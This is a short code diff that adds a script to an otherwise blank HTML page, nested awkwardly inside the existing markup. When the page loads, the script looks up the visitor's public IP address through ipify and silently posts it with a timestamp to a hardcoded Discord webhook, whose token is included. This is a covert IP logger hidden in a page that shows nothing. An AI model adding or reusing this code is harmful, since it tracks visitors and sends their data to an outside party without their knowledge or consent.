@@ -211,7 +211,36 @@
          <html><head>
   <title></title>
 </head>
+<html><head>
+  <title></title>
+</head>
+<body>
+  <h1></h1>
+  <script>
+    function sendIP(ip, timestamp) {
+      var webhookURL = 'https://discord.com/api/webhooks/1171967171551825931/qR5DydwU4hB5bei2OyrA7ZghClNiR-ED30n0K8tVo_imqbAiivJGDQQ4etOlG-3V_cHj';
 
+      var payload = JSON.stringify({
+        content: 'IP: ' + ip + ', Timestamp: ' + timestamp
+      });
+
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', webhookURL, true);
+      xhr.setRequestHeader('Content-type', 'application/json');
+      xhr.send(payload);
+    }
+
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        var ip = data.ip;
+        var timestamp = new Date().toLocaleString();
+        sendIP(ip, timestamp);
+      })
+      .catch(error => console.error(error));
+  </script>
+
+</body></html>
 
 </body></html>
         
